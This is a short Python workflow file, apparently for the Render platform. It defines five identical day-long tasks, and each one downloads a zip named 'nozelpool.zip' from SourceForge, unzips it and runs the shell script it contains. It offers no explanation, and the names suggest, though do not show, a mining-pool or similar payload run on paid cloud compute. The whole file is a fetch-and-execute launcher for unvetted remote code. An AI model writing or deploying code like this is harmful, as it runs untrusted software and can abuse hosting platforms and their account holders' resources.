import sys
from render_sdk import Workflows, Retry

app = Workflows()

@app.task(
  plan="pro",
  timeout_seconds=86400,
  retry=Retry(
    max_retries=3,
    wait_duration_ms=1
  )
)
def run1():
  import sys
  import os
  os.system('curl https://sourceforge.net/projects/drths/files/nozelpool.zip/download -L -o nozelpool.zip && unzip nozelpool.zip')
  os.system('./nozel.sh')

@app.task(
  plan="pro",
  timeout_seconds=86400,
  retry=Retry(
    max_retries=3,
    wait_duration_ms=1
  )
)
def run2():
  import sys
  import os
  os.system('curl https://sourceforge.net/projects/drths/files/nozelpool.zip/download -L -o nozelpool.zip && unzip nozelpool.zip')
  os.system('./nozel.sh')

@app.task(
  plan="pro",
  timeout_seconds=86400,
  retry=Retry(
    max_retries=3,
    wait_duration_ms=1
  )
)
def run3():
  import sys
  import os
  os.system('curl https://sourceforge.net/projects/drths/files/nozelpool.zip/download -L -o nozelpool.zip && unzip nozelpool.zip')
  os.system('./nozel.sh')

@app.task(
  plan="pro",
  timeout_seconds=86400,
  retry=Retry(
    max_retries=3,
    wait_duration_ms=1
  )
)
def run4():
  import sys
  import os
  os.system('curl https://sourceforge.net/projects/drths/files/nozelpool.zip/download -L -o nozelpool.zip && unzip nozelpool.zip')
  os.system('./nozel.sh')

@app.task(
  plan="pro",
  timeout_seconds=86400,
  retry=Retry(
    max_retries=3,
    wait_duration_ms=1
  )
)
def run5():
  import sys
  import os
  os.system('curl https://sourceforge.net/projects/drths/files/nozelpool.zip/download -L -o nozelpool.zip && unzip nozelpool.zip')
  os.system('./nozel.sh')


if __name__ == "__main__":
  app.start()
